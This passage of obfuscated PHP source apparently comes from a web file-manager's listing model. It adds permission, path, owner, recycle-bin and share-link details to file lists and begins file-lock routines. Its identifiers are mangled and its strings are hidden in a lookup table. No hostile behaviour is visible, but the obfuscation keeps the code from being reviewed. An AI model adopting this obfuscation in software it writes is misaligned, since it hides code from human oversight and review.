¼Ğáé½) { $ƒª´Ü«Ò = $ ¼Ğáé½[$ëÇó’Á§[468]]; if (!$ƒª´Ü«Ò || !is_array($øÈĞ²Ô[$ƒª´Ü«Ò])) { continue; } $Äê†è¾š = $øÈĞ²Ô[$ƒª´Ü«Ò]; $Äê†è¾š[$ëÇó’Á§[76]] = $ ¼Ğáé½[$ëÇó’Á§[76]]; $Äê†è¾š[$ëÇó’Á§[32]] = $ ¼Ğáé½[$ëÇó’Á§[32]]; if (!isset(self::$cacheFileInfo[$ëÇó’Á§[474] . $ƒª´Ü«Ò])) { self::$cacheFileInfo[$ëÇó’Á§[474] . $ƒª´Ü«Ò] = array_merge(array(), $Äê†è¾š); } unset($øÈĞ²Ô[$ƒª´Ü«Ò][$ëÇó’Á§[84]]); $ô£Öß„ = is_array($ø¨Æ²İ [$ƒª´Ü«Ò]) ? $ø¨Æ²İ [$ƒª´Ü«Ò] : array(); $ ¼Ğáé½[$ëÇó’Á§[170]] = array_merge($ô£Öß„, $øÈĞ²Ô[$ƒª´Ü«Ò]); if (isset($ ¼Ğáé½[$ëÇó’Á§[170]][$ëÇó’Á§[169]])) { $ ¼Ğáé½[$ëÇó’Á§[169]] = json_decode($ ¼Ğáé½[$ëÇó’Á§[170]][$ëÇó’Á§[169]], !0); unset($ ¼Ğáé½[$ëÇó’Á§[170]][$ëÇó’Á§[169]]); } } unset($ ¼Ğáé½); } protected function _listAppendSourceInfo(&$“ƒšñåÊ, $­æ™ø©) { $à¥‰Àœö =& $_SERVER[óó‹¸‚å]; if (!defined($à¥‰Àœö[475])) { return; } $¬ûÓ½ = Model($à¥‰Àœö[476])->listData(); $´Ö¿É‘« = Model($à¥‰Àœö[425])->listData(); $ä°Š°ÎÂ = Model($à¥‰Àœö[415])->listData(); $Ë¹„ªë = Model($à¥‰Àœö[477])->listSimple(); $Ìú³ä¨ = array_to_keyvalue($¬ûÓ½, $à¥‰Àœö[399]); $§úÚª†Š = array_to_keyvalue_group($´Ö¿É‘«, $à¥‰Àœö[84], $à¥‰Àœö[426]); $Œè™®—® = array_to_keyvalue($ä°Š°ÎÂ, $à¥‰Àœö[84]); $ÇİÜèæÂ = array_to_keyvalue_group($Ë¹„ªë, $à¥‰Àœö[402]); foreach ($“ƒšñåÊ as &$Û«˜–Ôú) { $Û«˜–Ôú[$à¥‰Àœö[86]] = array($à¥‰Àœö[478] => 0, $à¥‰Àœö[479] => 0, $à¥‰Àœö[480] => 0); if (isset($Œè™®—®[$Û«˜–Ôú[$à¥‰Àœö[402]]])) { $Û«˜–Ôú[$à¥‰Àœö[86]][$à¥‰Àœö[481]] = 1; $Û«˜–Ôú[$à¥‰Àœö[86]][$à¥‰Àœö[482]] = $Œè™®—®[$Û«˜–Ôú[$à¥‰Àœö[402]]][$à¥‰Àœö[32]]; } if ($§úÚª†Š && $Ìú³ä¨ && isset($§úÚª†Š[$Û«˜–Ôú[$à¥‰Àœö[402]]])) { $Û«˜–Ôú[$à¥‰Àœö[86]][$à¥‰Àœö[483]] = array(); foreach ($§úÚª†Š[$Û«˜–Ôú[$à¥‰Àœö[402]]] as $æ˜ê±) { $£ƒà¡˜« = $Ìú³ä¨[$æ˜ê±]; $Û«˜–Ôú[$à¥‰Àœö[86]][$à¥‰Àœö[483]][] = array($à¥‰Àœö[484] => $£ƒà¡˜«[$à¥‰Àœö[399]], $à¥‰Àœö[420] => $£ƒà¡˜«[$à¥‰Àœö[32]], $à¥‰Àœö[485] => $£ƒà¡˜«[$à¥‰Àœö[486]]); } } if ($ÇİÜèæÂ && isset($ÇİÜèæÂ[$Û«˜–Ôú[$à¥‰Àœö[402]]])) { $Û«˜–Ôú[$à¥‰Àœö[86]][$à¥‰Àœö[487]] = array(); foreach ($ÇİÜèæÂ[$Û«˜–Ôú[$à¥‰Àœö[402]]] as $ÛáàËç¡) { $Û«˜–Ôú[$à¥‰Àœö[86]][$à¥‰Àœö[487]] = array($à¥‰Àœö[488] => $ÛáàËç¡[$à¥‰Àœö[489]], $à¥‰Àœö[490] => $ÛáàËç¡[$à¥‰Àœö[491]], $à¥‰Àœö[492] => $ÛáàËç¡[$à¥‰Àœö[402]], $à¥‰Àœö[493] => $ÛáàËç¡[$à¥‰Àœö[494]], $à¥‰Àœö[495] => $ÛáàËç¡[$à¥‰Àœö[496]], $à¥‰Àœö[497] => $ÛáàËç¡[$à¥‰Àœö[497]], $à¥‰Àœö[498] => $ÛáàËç¡[$à¥‰Àœö[498]]); } } } unset($Û«˜–Ôú); return $“ƒšñåÊ; } protected function _listAppendChildren(&$õƒÊÄèó, $×ÀÚ‹ÔÛ) { $ İ’ÆÎ± =& $_SERVER[óó‹¸‚å]; $ëîôæÅ÷ = array(); $ŒÊó‘ = array($ İ’ÆÎ±[207] => 0, $ İ’ÆÎ±[208] => 0); foreach ($õƒÊÄèó as &$£ìŠÈ¬Î) { if (!$£ìŠÈ¬Î[$ İ’ÆÎ±[410]]) { continue; } $ëîôæÅ÷[] = $£ìŠÈ¬Î[$ İ’ÆÎ±[402]]; } unset($£ìŠÈ¬Î); if (!$ëîôæÅ÷) { return; } $µ«¬àÚô = array($ İ’ÆÎ±[432] => array($ İ’ÆÎ±[7], $ëîôæÅ÷), $ İ’ÆÎ±[431] => 0); $³Ìü½‰Æ = array($ İ’ÆÎ±[432], $ İ’ÆÎ±[410], $ İ’ÆÎ±[499] => $ İ’ÆÎ±[500]); $ƒ¡ÆŠüò = $this->field($³Ìü½‰Æ)->where($µ«¬àÚô)->group($ İ’ÆÎ±[501])->select(); $ÇòÌ‚îó = array(); foreach ($ƒ¡ÆŠüò as $é¶õ¦¸) { $±áÁµ¹¶ = $é¶õ¦¸[$ İ’ÆÎ±[432]]; $½¬¢»ç‡ = $é¶õ¦¸[$ İ’ÆÎ±[410]] == $ İ’ÆÎ±[88] ? $ İ’ÆÎ±[208] : $ İ’ÆÎ±[207]; if (!isset($ÇòÌ‚îó[$±áÁµ¹¶])) { $ÇòÌ‚îó[$±áÁµ¹¶] = array($ İ’ÆÎ±[207] => 0, $ İ’ÆÎ±[208] => 0); } $ÇòÌ‚îó[$±áÁµ¹¶][$½¬¢»ç‡] += $é¶õ¦¸[$ İ’ÆÎ±[500]]; } foreach ($õƒÊÄèó as &$£ìŠÈ¬Î) { if (!$£ìŠÈ¬Î[$ İ’ÆÎ±[410]]) { continue; } $ˆ‰Š´¢‹ = is_array($ÇòÌ‚îó[$£ìŠÈ¬Î[$ İ’ÆÎ±[402]]]) ? $ÇòÌ‚îó[$£ìŠÈ¬Î[$ İ’ÆÎ±[402]]] : $ŒÊó‘; $£ìŠÈ¬Î[$ İ’ÆÎ±[208]] = $ˆ‰Š´¢‹[$ İ’ÆÎ±[208]]; $£ìŠÈ¬Î[$ İ’ÆÎ±[207]] = $ˆ‰Š´¢‹[$ İ’ÆÎ±[207]]; unset($£ìŠÈ¬Î[$ İ’ÆÎ±[412]]); } unset($£ìŠÈ¬Î); } protected function _listAppendAuth(&$¶øÔâ) { $¹©È —¾ =& $_SERVER[óó‹¸‚å]; if (!defined($¹©È —¾[475])) { return; } $‡Íˆµ = array(); foreach ($¶øÔâ as $µ¦Ü€‚‘) { if ($µ¦Ü€‚‘[$¹©È —¾[411]] == self::TYPE_GROUP) { $‡Íˆµ[] = $µ¦Ü€‚‘[$¹©È —¾[402]]; } } if (!$‡Íˆµ) { return; } $İöùÀÀ¿ = array_to_keyvalue($¶øÔâ, $¹©È —¾[402]); $ÍÒÜÂœ = Model($¹©È —¾[502])->getSourceList($‡Íˆµ, $İöùÀÀ¿); $¿÷ıˆî = $GLOBALS[$¹©È —¾[503]] == 1; foreach ($¶øÔâ as $â¾¨¾ÅÏ => &$µ¦Ü€‚‘) { $µ¦Ü€‚‘[$¹©È —¾[413]] = $ÍÒÜÂœ[$µ¦Ü€‚‘[$¹©È —¾[402]]]; if (!$µ¦Ü€‚‘[$¹©È —¾[413]] && $µ¦Ü€‚‘[$¹©È —¾[411]] == self::TYPE_GROUP) { $µ¦Ü€‚‘[$¹©È —¾[413]] = Action($¹©È —¾[504])->pathGroupAuthMake($µ¦Ü€‚‘[$¹©È —¾[505]]); if (!$µ¦Ü€‚‘[$¹©È —¾[413]] && !$¿÷ıˆî) { $µ¦Ü€‚‘[$¹©È —¾[202]] = !1; $µ¦Ü€‚‘[$¹©È —¾[201]] = !1; } } if ($µ¦Ü€‚‘[$¹©È —¾[413]]) { $µ¦Ü€‚‘[$¹©È —¾[202]] = AuthModel::authCheckEdit($µ¦Ü€‚‘[$¹©È —¾[413]][$¹©È —¾[414]]); $µ¦Ü€‚‘[$¹©È —¾[201]] = AuthModel::authCheckView($µ¦Ü€‚‘[$¹©È —¾[413]][$¹©È —¾[414]]); } $this->groupPathDisplay($µ¦Ü€‚‘); } unset($µ¦Ü€‚‘); } public function _listAppendAuthSecret(&$ºõ£‚·ó) { $„¨¢Èß =& $_SERVER[óó‹¸‚å]; if (Model($„¨¢Èß[435])->get($„¨¢Èß[506]) != $„¨¢Èß[88]) { return; } static $ø˜ïÇéš = false; if (!$ø˜ïÇéš) { $¤Ô®­¿ = Model($„¨¢Èß[507]); $îÈÎ˜˜½ = Model($„¨¢Èß[508]); $ø˜ïÇéš = $îÈÎ˜˜½->listData(); $ø˜ïÇéš = array_to_keyvalue($ø˜ïÇéš, $„¨¢Èß[402]); $®„Å†íÀ = json_decode(Model($„¨¢Èß[435])->get($„¨¢Èß[509]), !0); $®„Å†íÀ = array_to_keyvalue($®„Å†íÀ, $„¨¢Èß[399]); foreach ($ø˜ïÇéš as $Æ­×‘Ú‰ => $·§¡§´) { $±ªğó¤Ä = $®„Å†íÀ[$·§¡§´[$„¨¢Èß[510]]]; if (!$±ªğó¤Ä) { $îÈÎ˜˜½->remove($·§¡§´[$„¨¢Èß[399]]); unset($ø˜ïÇéš[$Æ­×‘Ú‰]); continue; } $™úëÎ¤ò = $¤Ô®­¿->listData($±ªğó¤Ä[$„¨¢Èß[413]]); if (!$™úëÎ¤ò) { $îÈÎ˜˜½->remove($·§¡§´[$„¨¢Èß[399]]); unset($ø˜ïÇéš[$Æ­×‘Ú‰]); continue; } $·§¡§´[$„¨¢Èß[413]] = $™úëÎ¤ò; $·§¡§´[$„¨¢Èß[511]] = $±ªğó¤Ä; $·§¡§´[$„¨¢Èß[512]] = Model($„¨¢Èß[513])->getInfoSimpleOuter($·§¡§´[$„¨¢Èß[454]]); $ø˜ïÇéš[$Æ­×‘Ú‰] = $·§¡§´; } } $ñÒíúË = defined($„¨¢Èß[514]) ? USER_ID : $„¨¢Èß[12]; $…ôõ¦Ü = array(); $°èÂíŠ = $this->_listAppendPath($…ôõ¦Ü, !0); foreach ($ºõ£‚·ó as $Æ­×‘Ú‰ => &$·§¡§´) { if (!is_array($·§¡§´[$„¨¢Èß[413]])) { continue; } if ($·§¡§´[$„¨¢Èß[411]] != $„¨¢Èß[515]) { continue; } if (isset($ø˜ïÇéš[$·§¡§´[$„¨¢Èß[402]]])) { $ÙÎÆ«„ = $ø˜ïÇéš[$·§¡§´[$„¨¢Èß[402]]]; if (!is_array($·§¡§´[$„¨¢Èß[466]])) { $·§¡§´[$„¨¢Èß[466]] = array(); } $·§¡§´[$„¨¢Èß[466]][$„¨¢Èß[516]] = $ÙÎÆ«„[$„¨¢Èß[510]]; $·§¡§´[$„¨¢Èß[413]][$„¨¢Èß[517]] = $ÙÎÆ«„; $·§¡§´[$„¨¢Èß[413]][$„¨¢Èß[518]] = $·§¡§´[$„¨¢Èß[519]]; $·§¡§´[$„¨¢Èß[413]][$„¨¢Èß[520]] = $„¨¢Èß[88]; if ($ÙÎÆ«„[$„¨¢Èß[454]] != $ñÒíúË) { $·§¡§´[$„¨¢Èß[413]][$„¨¢Èß[414]] = $·§¡§´[$„¨¢Èß[413]][$„¨¢Èß[414]] & $ÙÎÆ«„[$„¨¢Èß[413]][$„¨¢Èß[413]]; } continue; } $£ú¤…¦ = $this->parentLevelArray($·§¡§´[$„¨¢Èß[521]]); $°¶ÅËÑÕ = array_reverse($£ú¤…¦); foreach ($°¶ÅËÑÕ as $ùà¾ÀŸÒ => $åß·«œû) { if (!isset($ø˜ïÇéš[$åß·«œû])) { continue; } $ÙÎÆ«„ = $ø˜ïÇéš[$åß·«œû]; $·§¡§´[$„¨¢Èß[413]][$„¨¢Èß[517]] = $ÙÎÆ«„; if ($ÙÎÆ«„[$„¨¢Èß[454]] != $ñÒíúË) { $·§¡§´[$„¨¢Èß[413]][$„¨¢Èß[414]] = $·§¡§´[$„¨¢Èß[413]][$„¨¢Èß[414]] & $ÙÎÆ«„[$„¨¢Èß[413]][$„¨¢Èß[413]]; } $Êˆ±™¯ = $„¨¢Èß[12]; $³’ş˜¤ = count($£ú¤…¦) - $ùà¾ÀŸÒ; for ($°Í‚—Ë÷ = 0; $°Í‚—Ë÷ < $³’ş˜¤; $°Í‚—Ë÷++) { if (!isset($°èÂíŠ[$£ú¤…¦[$°Í‚—Ë÷]])) { $Êˆ±™¯ = $„¨¢Èß[12]; break; } $Êˆ±™¯ = $Êˆ±™¯ . rtrim($°èÂíŠ[$£ú¤…¦[$°Í‚—Ë÷]], $„¨¢Èß[8]) . $„¨¢Èß[8]; } $·§¡§´[$„¨¢Èß[413]][$„¨¢Èß[518]] = rtrim($Êˆ±™¯, $„¨¢Èß[8]) . $„¨¢Èß[8]; break; } } unset($·§¡§´); } public function groupPathDisplay(&$»×´»†—) { $Ë€±‡ö =& $_SERVER[óó‹¸‚å]; if ($»×´»†—[$Ë€±‡ö[411]] != self::TYPE_GROUP) { return; } $öñ™ôş‹ = Model($Ë€±‡ö[522])->getInfo($»×´»†—[$Ë€±‡ö[505]]); $¼¦ãó£ = $this->parentLevelArray($öñ™ôş‹[$Ë€±‡ö[521]]); $Ä§“àæ¨ = $Ë€±‡ö[12]; foreach ($¼¦ãó£ as $Ò—¸Ş–) { $üî‘‰—ü = Model($Ë€±‡ö[522])->getInfo($Ò—¸Ş–); $Ä§“àæ¨ .= $üî‘‰—ü[$Ë€±‡ö[86]][$Ë€±‡ö[402]] . $Ë€±‡ö[50]; } $»×´»†—[$Ë€±‡ö[523]] = $öñ™ôş‹[$Ë€±‡ö[432]]; $»×´»†—[$Ë€±‡ö[524]] = $öñ™ôş‹[$Ë€±‡ö[521]]; $»×´»†—[$Ë€±‡ö[525]] = $öñ™ôş‹[$Ë€±‡ö[526]]; $»×´»†—[$Ë€±‡ö[527]] = $Ä§“àæ¨ . $öñ™ôş‹[$Ë€±‡ö[86]][$Ë€±‡ö[402]]; } protected function _listAppendPath(&$³Òşí‡‘, $û»³äû– = false) { $¯Ÿ´ÁÏ =& $_SERVER[óó‹¸‚å]; static $…ëÙÏ¾‡ = array(); $–´ÔŠÊ = array(); $ŠèœÍª  = array(); if ($û»³äû–) { return $…ëÙÏ¾‡; } foreach ($³Òşí‡‘ as &$îÇ¤İàÊ) { $óÆø·›ù = $îÇ¤İàÊ[$¯Ÿ´ÁÏ[402]]; if ($îÇ¤İàÊ[$¯Ÿ´ÁÏ[410]] == $¯Ÿ´ÁÏ[88] && $îÇ¤İàÊ[$¯Ÿ´ÁÏ[432]] != 0) { $…ëÙÏ¾‡[$óÆø·›ù] = $îÇ¤İàÊ[$¯Ÿ´ÁÏ[32]]; } if ($îÇ¤İàÊ[$¯Ÿ´ÁÏ[410]] == $¯Ÿ´ÁÏ[88] && $îÇ¤İàÊ[$¯Ÿ´ÁÏ[432]] == 0 && !isset($…ëÙÏ¾‡[$óÆø·›ù])) { $…ëÙÏ¾‡[$óÆø·›ù] = $this->_listAppendPathRoot($îÇ¤İàÊ, array()); } if (isset($ŠèœÍª [$îÇ¤İàÊ[$¯Ÿ´ÁÏ[521]]])) { continue; } $ŠèœÍª [$îÇ¤İàÊ[$¯Ÿ´ÁÏ[521]]] = !0; $Ä§ÇıÜÕ = $this->parentLevelArray($îÇ¤İàÊ[$¯Ÿ´ÁÏ[521]]); foreach ($Ä§ÇıÜÕ as $å½©îÓˆ => $ÓúÏ›ƒ) { if (isset($…ëÙÏ¾‡[$ÓúÏ›ƒ])) { continue; } if ($å½©îÓˆ == 0) { $…ëÙÏ¾‡[$ÓúÏ›ƒ] = $this->_listAppendPathRoot($îÇ¤İàÊ, $Ä§ÇıÜÕ); } if ($å½©îÓˆ != 0) { $–´ÔŠÊ[] = $ÓúÏ›ƒ; } } } unset($îÇ¤İàÊ); $–´ÔŠÊ = array_unique($–´ÔŠÊ); if (count($–´ÔŠÊ) > 0) { $ªÄ´¬Àà = array($¯Ÿ´ÁÏ[417] => array($¯Ÿ´ÁÏ[418], $–´ÔŠÊ)); if (count($–´ÔŠÊ) == 1) { $ƒÙ‡ã  = $this->sourceInfo($–´ÔŠÊ[0]); $®©¦£Ÿ¥ = is_array($ƒÙ‡ã ) ? array($ƒÙ‡ã ) : !1; } else { $®©¦£Ÿ¥ = $this->field($¯Ÿ´ÁÏ[528])->where($ªÄ´¬Àà)->select(); } if (!$®©¦£Ÿ¥) { $®©¦£Ÿ¥ = array(); } foreach ($®©¦£Ÿ¥ as $“à¹¥ò) { $…ëÙÏ¾‡[$“à¹¥ò[$¯Ÿ´ÁÏ[402]]] = $“à¹¥ò[$¯Ÿ´ÁÏ[32]]; } } $–·ŒĞæû = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $¬øÅ¶“æ = array(); foreach ($³Òşí‡‘ as &$îÇ¤İàÊ) { $Œ½­‡Å = $îÇ¤İàÊ[$¯Ÿ´ÁÏ[521]]; $›ÕóÔû = $¯Ÿ´ÁÏ[12]; if (isset($¬øÅ¶“æ[$Œ½­‡Å])) { $›ÕóÔû = $¬øÅ¶“æ[$Œ½­‡Å]; } else { $Ä§ÇıÜÕ = $this->parentLevelArray($îÇ¤İàÊ[$¯Ÿ´ÁÏ[521]]); foreach ($Ä§ÇıÜÕ as $å½©îÓˆ => $ÓúÏ›ƒ) { if (isset($…ëÙÏ¾‡[$ÓúÏ›ƒ])) { $›ÕóÔû .= $…ëÙÏ¾‡[$ÓúÏ›ƒ] . $¯Ÿ´ÁÏ[8]; } } $¬øÅ¶“æ[$Œ½­‡Å] = $›ÕóÔû; } $›ÕóÔû .= $îÇ¤İàÊ[$¯Ÿ´ÁÏ[32]]; if ($îÇ¤İàÊ[$¯Ÿ´ÁÏ[410]] == $¯Ÿ´ÁÏ[88]) { $›ÕóÔû .= $¯Ÿ´ÁÏ[8]; } $îÇ¤İàÊ[$¯Ÿ´ÁÏ[519]] = str_replace($¯Ÿ´ÁÏ[529], $¯Ÿ´ÁÏ[8], $›ÕóÔû); if ($îÇ¤İàÊ[$¯Ÿ´ÁÏ[432]] == $¯Ÿ´ÁÏ[197]) { $îÇ¤İàÊ[$¯Ÿ´ÁÏ[32]] = trim($…ëÙÏ¾‡[$îÇ¤İàÊ[$¯Ÿ´ÁÏ[402]]], $¯Ÿ´ÁÏ[8]); $îÇ¤İàÊ[$¯Ÿ´ÁÏ[519]] = $îÇ¤İàÊ[$¯Ÿ´ÁÏ[32]] . $¯Ÿ´ÁÏ[8]; } if (intval($îÇ¤İàÊ[$¯Ÿ´ÁÏ[411]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($îÇ¤İàÊ, $Ä§ÇıÜÕ, $–·ŒĞæû); } } unset($îÇ¤İàÊ); return $³Òşí‡‘; } private function _listAppendPathRecycle(&$·–æ¼÷¹, $ÁóäŠû, $Ü’üÃéÑ) { $ëÏı—Ñ® =& $_SERVER[óó‹¸‚å]; if (!in_array($Ü’üÃéÑ, $ÁóäŠû) && $·–æ¼÷¹[$ëÏı—Ñ®[402]] != $Ü’üÃéÑ) { return; } $¨şÏîğû = explode($ëÏı—Ñ®[8], trim($·–æ¼÷¹[$ëÏı—Ñ®[519]], $ëÏı—Ñ®[8])); $ËÍÓ¯ää = implode($ëÏı—Ñ®[8], array_slice($¨şÏîğû, 2)); $·–æ¼÷¹[$ëÏı—Ñ®[519]] = $ëÏı—Ñ®[8] . LNG($ëÏı—Ñ®[530]) . $ëÏı—Ñ®[8] . ltrim($ËÍÓ¯ää, $ëÏı—Ñ®[8]); $·–æ¼÷¹[$ëÏı—Ñ®[521]] = $ëÏı—Ñ®[531] . implode($ëÏı—Ñ®[50], array_slice($ÁóäŠû, 1)) . $ëÏı—Ñ®[50]; if ($·–æ¼÷¹[$ëÏı—Ñ®[402]] == $Ü’üÃéÑ) { $·–æ¼÷¹[$ëÏı—Ñ®[521]] = $ëÏı—Ñ®[531]; $·–æ¼÷¹[$ëÏı—Ñ®[432]] = $ëÏı—Ñ®[197]; $·–æ¼÷¹[$ëÏı—Ñ®[32]] = LNG($ëÏı—Ñ®[530]); } $·–æ¼÷¹[$ëÏı—Ñ®[532]] = $ëÏı—Ñ®[533]; } protected function _listAppendPathRoot(&$§¯Êöß˜, $ÜÈæÚ¬) { $øòĞçïÀ =& $_SERVER[óó‹¸‚å]; static $†ÆÜ…İş = false; $µ™È–Ş = $øòĞçïÀ[12]; if ($§¯Êöß˜[$øòĞçïÀ[411]] == self::TYPE_USER) { if (defined($øòĞçïÀ[475]) && $§¯Êöß˜[$øòĞçïÀ[505]] == USER_ID) { $µ™È–Ş = LNG($øòĞçïÀ[534]); if ($†ÆÜ…İş === !1) { $®üÑéº = Model($øòĞçïÀ[535])->getInfoFull(USER_ID); $†ÆÜ…İş = _get($®üÑéº, $øòĞçïÀ[536], $øòĞçïÀ[12]); } if ($ÜÈæÚ¬ && $ÜÈæÚ¬[0] == $†ÆÜ…İş || !$ÜÈæÚ¬ && $§¯Êöß˜[$øòĞçïÀ[402]] == $†ÆÜ…İş) { $µ™È–Ş = LNG($øòĞçïÀ[537]); $§¯Êöß˜[$øòĞçïÀ[538]] = $øòĞçïÀ[539]; } if (!$ÜÈæÚ¬) { $§¯Êöß˜[$øòĞçïÀ[32]] = $µ™È–Ş; } } else { $ı‚ëÉ§ö = Model($øòĞçïÀ[513])->getInfoSimple($§¯Êöß˜[$øòĞçïÀ[505]]); $µ™È–Ş = LNG($øòĞçïÀ[540]) . $øòĞçïÀ[162] . $ı‚ëÉ§ö[$øòĞçïÀ[32]] . $øòĞçïÀ[164]; $§¯Êöß˜[$øòĞçïÀ[541]] = array($øòĞçïÀ[32] => $ı‚ëÉ§ö[$øòĞçïÀ[32]], $øòĞçïÀ[542] => $ı‚ëÉ§ö[$øòĞçïÀ[542]], $øòĞçïÀ[543] => $ı‚ëÉ§ö[$øòĞçïÀ[543]]); } } else { if ($§¯Êöß˜[$øòĞçïÀ[411]] == self::TYPE_GROUP) { $ı‚ëÉ§ö = Model($øòĞçïÀ[522])->getInfoSimple($§¯Êöß˜[$øòĞçïÀ[505]]); $µ™È–Ş = $ı‚ëÉ§ö[$øòĞçïÀ[32]]; } else { if ($§¯Êöß˜[$øòĞçïÀ[411]] == self::TYPE_SYSTEM) { $µ™È–Ş = $øòĞçïÀ[544]; } } } $µ™È–Ş = $µ™È–Ş ? $øòĞçïÀ[8] . $µ™È–Ş . $øòĞçïÀ[8] : $øòĞçïÀ[8]; return $µ™È–Ş; } protected function _listAppendUser(&$™±Òäú–) { $êƒÊŒÂ =& $_SERVER[óó‹¸‚å]; $ùúúÀÇÅ = array_to_keyvalue($™±Òäú–, $êƒÊŒÂ[12], $êƒÊŒÂ[454]); $ÌµÜÀòö = array_to_keyvalue($™±Òäú–, $êƒÊŒÂ[12], $êƒÊŒÂ[456]); $˜É” Ñæ = array_merge($ùúúÀÇÅ, $ÌµÜÀòö); $ïÍú§Ã = Model($êƒÊŒÂ[535])->userListInfo($˜É” Ñæ); foreach ($™±Òäú– as &$ı»¹Éç·) { $’ªĞæ„´ = $ı»¹Éç·[$êƒÊŒÂ[454]]; $ı»¹Éç·[$êƒÊŒÂ[454]] = $ïÍú§Ã[$’ªĞæ„´] ? $ïÍú§Ã[$’ªĞæ„´] : !1; $’ªĞæ„´ = $ı»¹Éç·[$êƒÊŒÂ[456]]; $ı»¹Éç·[$êƒÊŒÂ[456]] = $ïÍú§Ã[$’ªĞæ„´] ? $ïÍú§Ã[$’ªĞæ„´] : !1; if (isset($ı»¹Éç·[$êƒÊŒÂ[466]]) && $ı»¹Éç·[$êƒÊŒÂ[466]][$êƒÊŒÂ[545]]) { $”¶Ê‰Šè = $GLOBALS[$êƒÊŒÂ[6]][$êƒÊŒÂ[89]][$êƒÊŒÂ[546]]; if ($ı»¹Éç·[$êƒÊŒÂ[466]][$êƒÊŒÂ[547]] <= time() - $”¶Ê‰Šè) { $this->metaSet($ı»¹Éç·[$êƒÊŒÂ[402]], $êƒÊŒÂ[545], null); $this->metaSet($ı»¹Éç·[$êƒÊŒÂ[402]], $êƒÊŒÂ[547], null); unset($ı»¹Éç·[$êƒÊŒÂ[466]][$êƒÊŒÂ[545]]); continue; } $¶©»ÂÀ• = $ı»¹Éç·[$êƒÊŒÂ[466]][$êƒÊŒÂ[545]]; $ı»¹Éç·[$êƒÊŒÂ[466]][$êƒÊŒÂ[548]] = Model($êƒÊŒÂ[535])->getInfoSimpleOuter($¶©»ÂÀ•); } } unset($ı»¹Éç·); } public function parentLevelArray($°şò£¦™) { $ø™ßÂÜ =& $_SERVER[óó‹¸‚å]; $°şò£¦™ = explode($ø™ßÂÜ[50], trim($°şò£¦™, $ø™ßÂÜ[50])); return array_remove_value($°şò£¦™, $ø™ßÂÜ[197]); } public function listAll($‘€„Ú·) { $ääÛœú— =& $_SERVER[óó‹¸‚å]; $ºÜï„±© = $this->sourceInfo($‘€„Ú·); $¦ç’©ğ± = array($ääÛœú—[549] => array($ääÛœú—[550], $ºÜï„±©[$ääÛœú—[521]] . $‘€„Ú· . $ääÛœú—[551]), $ääÛœú—[552] => 0); $‹€Ö…û = $ääÛœú—[553]; $ÎÈ¯ ô½ = "\x4c\x45\106\x54\x20\x4a\x4f\111\116\x20{$this->tablePrefix}\x69\157\x5f\x66\x69\x6c\x65\40\x66\x69\154\145\40\x6f\x6e\40\x73\157\x75\162\143\145\x2e\x66\x69\x6c\145\x49\104\x20\x3d\40\x66\x69\154\145\x2e\x66\x69\154\145\x49\104"; $àíˆÓíæ = $this->alias($ääÛœú—[446])->field($‹€Ö…û)->where($¦ç’©ğ±)->join($ÎÈ¯ ô½)->select(); $this->_listAppendAuth($àíˆÓíæ); $this->_listAppendUser($àíˆÓíæ); $this->_listAppendPath($àíˆÓíæ); $àíˆÓíæ = array_to_keyvalue($àíˆÓíæ, $ääÛœú—[402]); $–ìèÖÚ = "\57{$ºÜï„±©[$ääÛœú—[32]]}\57"; $–ìèÖÚ = $–ìèÖÚ == $ääÛœú—[529] ? $ääÛœú—[8] : $–ìèÖÚ; $¨ÕŠ·×¢ = array(); foreach ($àíˆÓíæ as $ŸşÙš­Ï => $ûÅÅÀƒ„) { $ùšƒÚŠ = $this->parentLevelArray($ûÅÅÀƒ„[$ääÛœú—[521]]); array_shift($ùšƒÚŠ); $ÔØıå = $–ìèÖÚ; for ($ŒùúÕ = 0; $ŒùúÕ < count($ùšƒÚŠ); $ŒùúÕ++) { $ÔØıå .= $àíˆÓíæ[$ùšƒÚŠ[$ŒùúÕ]][$ääÛœú—[32]] . $ääÛœú—[8]; } $ÔØıå .= $ûÅÅÀƒ„[$ääÛœú—[32]]; if ($ûÅÅÀƒ„[$ääÛœú—[410]]) { $ÔØıå .= $ääÛœú—[8]; } $ÔØıå = str_replace($ääÛœú—[529], $ääÛœú—[8], $ÔØıå); $ÔØıå = str_replace($ääÛœú—[529], $ääÛœú—[8], $ÔØıå); $ñ²€îùƒ = array($ääÛœú—[421] => str_replace($ääÛœú—[529], $ääÛœú—[8], $ÔØıå), $ääÛœú—[554] => intval($ûÅÅÀƒ„[$ääÛœú—[410]]), $ääÛœú—[86] => $this->pathInfoFilter($ûÅÅÀƒ„)); if (!$ûÅÅÀƒ„[$ääÛœú—[410]]) { $ñ²€îùƒ[$ääÛœú—[468]] = $ûÅÅÀƒ„[$ääÛœú—[468]]; $ñ²€îùƒ[$ääÛœú—[87]] = $ûÅÅÀƒ„[$ääÛœú—[84]]; } $¨ÕŠ·×¢[] = $ñ²€îùƒ; } return $¨ÕŠ·×¢; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($ì¥Ï¦Äô) { $„Ã…›¶§ =& $_SERVER[óó‹¸‚å]; if (!$this->allowLock()) { return; } $this->_lockCheck($„Ã…›¶§[555], $ì¥Ï¦Äô); $õÍ¼ = 1; $this->_lockEvent($ì¥Ï¦Äô, array($„Ã…›¶§[556], $„Ã…›¶§[557]), $õÍ¼); $this->_lockParent($ì¥Ï¦Äô, array($„Ã…›¶§[557]), $õÍ¼); $this->_lockEvent($ì¥Ï¦Äô, array($„Ã…›¶§[558], $„Ã…›¶§[559]), $õÍ¼); $this->_lockCheckEnd($„Ã…›¶§[555], $ì¥Ï¦Äô); } public function lockCopyEnd($ã¿ù¤ê“) { $‡ªÌ±Œ… =& $_SERVER[óó‹¸‚å]; if (!$this->allowLock()) { return; } $•«Ä››á = 0; $this->_lockEvent($ã¿ù¤ê“, array($‡ªÌ±Œ…[556], $‡ªÌ±Œ…[557]), $•«Ä››á); $this->_lockParent($ã¿ù¤ê“, array($‡ªÌ±Œ…[557]), $•«Ä››á); $this->_lockEvent($ã¿ù¤ê“, array($‡ªÌ±Œ…[558], $‡ªÌ±Œ…[559]), $•«Ä››á); } public function lockWriteStart($—şĞ˜è“, $ŠËš±¡õ = '') { $´İ·‡Íˆ =& $_SERVER[óó‹¸‚å]; if (!$this->allowLock()) { return; } $this->_lockCheck($´İ·‡Íˆ[556], $—şĞ˜è“); $ß‚ÍÉò¥ = 1; 